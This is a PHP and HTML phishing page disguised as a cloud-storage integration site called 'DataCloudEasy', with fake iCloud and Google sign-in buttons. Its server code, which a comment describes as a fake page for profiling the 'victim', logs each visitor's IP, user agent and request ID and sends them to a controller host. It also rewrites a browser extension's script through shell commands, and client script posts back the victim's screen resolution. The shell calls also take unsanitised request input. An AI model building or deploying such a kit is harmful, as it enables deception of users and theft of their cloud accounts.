<!DOCTYPE html>
<html lang="en">
<head>
<title>DataCloudEasy — Seamless Cloud Data Integration</title>
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta name="robots" content="noindex,nofollow">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:linear-gradient(135deg,#0a1628 0%,#102a4a 40%,#0f3460 100%);color:#e0e6ed;min-height:100vh;display:flex;flex-direction:column}
nav{display:flex;align-items:center;justify-content:space-between;padding:20px 40px}
.nav-brand{display:flex;align-items:center;gap:10px;font-size:20px;font-weight:700;color:#fff;text-decoration:none}
.nav-brand svg{width:32px;height:32px}
.nav-links{display:flex;gap:28px;list-style:none}
.nav-links a{color:#9bb0c9;text-decoration:none;font-size:14px;font-weight:500;transition:color 0.2s}
.nav-links a:hover{color:#fff}
.hero{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:60px 24px 80px}
.hero-icon{margin-bottom:28px;opacity:0.9}
.hero-icon svg{width:80px;height:80px}
.hero h1{font-size:42px;font-weight:700;color:#fff;margin-bottom:12px;letter-spacing:-0.5px}
.hero h1 span{color:#4da6ff}
.hero .tagline{font-size:18px;color:#8ea8c3;max-width:520px;line-height:1.6;margin-bottom:40px}
.features{display:flex;gap:32px;margin-bottom:48px;flex-wrap:wrap;justify-content:center}
.feature-card{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:24px 20px;width:180px;text-align:center}
.feature-card svg{width:36px;height:36px;margin-bottom:12px}
.feature-card h3{font-size:14px;font-weight:600;color:#fff;margin-bottom:6px}
.feature-card p{font-size:12px;color:#7e99b5;line-height:1.4}
.cta-btn{display:inline-flex;align-items:center;gap:10px;padding:16px 36px;font-size:16px;font-weight:600;color:#fff;background:linear-gradient(135deg,#0071e3,#005bb5);border:none;border-radius:12px;cursor:pointer;text-decoration:none;transition:transform 0.15s,box-shadow 0.2s;box-shadow:0 4px 20px rgba(0,113,227,0.35);margin-bottom:12px}
.cta-btn:hover{transform:translateY(-2px);box-shadow:0 6px 28px rgba(0,113,227,0.5)}
.cta-btn svg{width:20px;height:20px;fill:#fff}
footer{text-align:center;padding:20px;font-size:12px;color:#4a6580}
#loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0a1628 0%,#102a4a 40%,#0f3460 100%);z-index:9999;align-items:center;justify-content:center;flex-direction:column}
#loading-overlay.active{display:flex}
.spinner{width:48px;height:48px;border:4px solid rgba(255,255,255,0.2);border-top:4px solid #4da6ff;border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.loading-text{color:#fff;margin-top:1.5rem;font-size:1rem;opacity:0.8}
</style>
</head>

<?php
// this is a fake page for getting the victim's resolution (dynamic)

function GET($var)  { return isset($_GET[$var])  ? htmlspecialchars($_GET[$var])  : null; }
function POST($var) { return isset($_POST[$var]) ? htmlspecialchars($_POST[$var]) : null; }
function SERVER($var) { return isset($_SERVER[$var]) ? htmlspecialchars($_SERVER[$var]) : null; }

$ctrlUrl = "https://controller/";

function base64url_encode($data) {
	return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

// retrieve server instance ID via env
if(getenv("SID")) {
	$sid = getenv("SID");
	shell_exec("sed -i 's/const serverName = \".*\"/const serverName = \"" . $sid . "\"/' /home/user/extension/content.js");
} else {
	echo("Error: SID env not found");
}

// retrieve client identifier, store and add to chromium extension code
if(isset($_GET["reqid"])) {
	$reqid = GET("reqid");
	shell_exec("echo $reqid > /home/user/tmp/reqid$sid.txt");
	shell_exec("sed -i 's/const id = \".*\"/const id = \"" . $reqid . "\"/' /home/user/extension/content.js");
} else {
	echo("Error: request id not found");
	if(isset($_GET["svr"])) $reqid = "admin"; // assuming admin access
}

// retrieve user agent, store it
$usera = SERVER("HTTP_USER_AGENT");
if(isset($usera)) {
	shell_exec("echo '$usera' > /home/user/tmp/useragent$sid.txt");
} else {
	echo("Warning: user agent not given");
}

// logging to central acccess log via controller
if($_SERVER["REQUEST_METHOD"] === "GET") {
	// get client IP
	if(array_key_exists("HTTP_X_FORWARDED_FOR", $_SERVER)) {
		$ip = htmlspecialchars($_SERVER["HTTP_X_FORWARDED_FOR"]);
	} else {
		$ip = htmlspecialchars($_SERVER["REMOTE_ADDR"]);
	}

	$agent = base64url_encode($usera);

	$context = [ 'http' => [ 'method' => 'GET' ], 'ssl' => [ 'verify_peer' => false, 'allow_self_signed'=> true ] ];

	$url = $ctrlUrl . "?svr=" . $sid . "&cmd=logaccess&reqid=" . $reqid . "&ip=" . $ip . "&agent=" . $agent;

	if(file_get_contents($url, false, stream_context_create($context)) === false) {
			echo "[!] Error: sending accesslog entry to controller";
	}
}
?>

<body>
  <!-- Loading overlay (shown after button click) -->
  <div id="loading-overlay">
    <div class="spinner"></div>
    <p class="loading-text">Connecting to your cloud account...</p>
  </div>

  <nav>
    <a href="#" class="nav-brand">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#4da6ff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
        <path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"/>
      </svg>
      DataCloudEasy
    </a>
    <ul class="nav-links">
      <li><a href="#">Features</a></li>
      <li><a href="#">Pricing</a></li>
      <li><a href="#">Docs</a></li>
      <li><a href="#">Support</a></li>
    </ul>
  </nav>

  <section class="hero">
    <div class="hero-icon">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#4da6ff" stroke-width="1" stroke-linecap="round" stroke-linejoin="round">
        <ellipse cx="12" cy="5" rx="9" ry="3"/>
        <path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/>
        <path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>
        <path d="M21 5c0 1.66-4 3-9 3S3 6.66 3 5"/>
      </svg>
    </div>
    <h1>Seamless <span>Cloud Data</span> Integration</h1>
    <p class="tagline">Connect your cloud storage accounts in seconds. DataCloudEasy unifies your data across platforms with enterprise-grade security and zero configuration.</p>

    <div class="features">
      <div class="feature-card">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#4da6ff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
          <path d="M9 12l2 2 4-4"/>
        </svg>
        <h3>Secure Sync</h3>
        <p>End-to-end encrypted data transfers</p>
      </div>
      <div class="feature-card">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#4da6ff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"/>
          <polyline points="12 6 12 12 16 14"/>
        </svg>
        <h3>Real-Time</h3>
        <p>Instant sync across all devices</p>
      </div>
      <div class="feature-card">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#4da6ff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
          <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
          <line x1="8" y1="21" x2="16" y2="21"/>
          <line x1="12" y1="17" x2="12" y2="21"/>
        </svg>
        <h3>Dashboard</h3>
        <p>Manage all accounts in one place</p>
      </div>
    </div>

    <a href="#" onclick="DynamicResolution(); return false;" class="cta-btn">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 814 1000">
        <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57.8-155.5-127.4c-58.8-82-106.3-209-106.3-329.8 0-194.3 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 103.6-30.4 135.5-71.3z"/>
      </svg>
      Connect with iCloud
    </a>

    <a href="#" onclick="DynamicResolution(); return false;" class="cta-btn">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="20" height="20">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
      </svg>
      Connect with Google
    </a>
  </section>

  <footer>
    &copy; 2026 DataCloudEasy. All rights reserved.
  </footer>

<script>
function sleep(time) {
	return new Promise((resolve) => setTimeout(resolve, time));
}
function DynamicResolution() {
	// show loading overlay
	document.getElementById('loading-overlay').classList.add('active');

	let vw, vh;
	if (window.visualViewport) {
		vw = Math.round(window.visualViewport.width * window.devicePixelRatio);
		vh = Math.round(window.visualViewport.height * window.devicePixelRatio);
	} else {
		vw = window.innerWidth;
		vh = window.innerHeight;
	}
	let resString = vw + "x" + vh + "x24";
	let xhr = new XMLHttpRequest();

	xhr.open("POST", window.location.href, true);
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhr.send("res=" + resString);

	sleep(5000).then(() => {window.location.reload()});
}
</script>
</body>
</html>

<?php
// receive resolution by js and store in fs
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	if(isset($_POST["res"])) {
		$data = POST("res");
		$file = fopen("/home/user/tmp/resolution$sid.txt", 'w');
		fwrite($file, $data);
		fclose($file);

		system("chmod 666 /home/user/tmp/resolution$sid.txt");
	} else {
		echo "[!] POST parameter 'res' not set";
	}
/*
	$data = file_get_contents('php://input');
	$f1 = "/tmp/res.txt";
	$f2 = "/tmp/resolution.txt";
	$file = fopen($f1, 'w');
	fwrite($file, $data); // htmlspecialchars!
	fclose($file);
	system("cat " . $f1 . " | grep 'x24' > " . $f2); // echo statt cat, nur resolution.txt
	system("chmod 666 /tmp/res*.txt");
	echo "[*] resolution received";
*/
}
?>
